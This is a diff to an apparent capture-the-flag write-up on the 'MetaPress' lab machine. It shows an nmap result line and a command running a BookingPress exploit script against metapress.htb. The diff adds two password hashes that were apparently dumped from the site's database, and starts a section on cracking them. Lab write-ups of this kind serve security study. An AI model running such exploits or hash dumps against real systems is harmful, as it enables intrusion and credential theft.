@@ -102,5 +102,10 @@ Nmap done: 1 IP address (1 host up) scanned in 214.25 seconds
 ▶ python booking-press-expl.py --url http://metapress.htb --nonce 55b094723b
 ```
 ![image](https://user-images.githubusercontent.com/83878909/233048115-82eca30b-607b-466f-820d-1c011dc1c67c.png)
+  - Password Hashes
+```
+$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+```
 
-
+### Crack Hashes
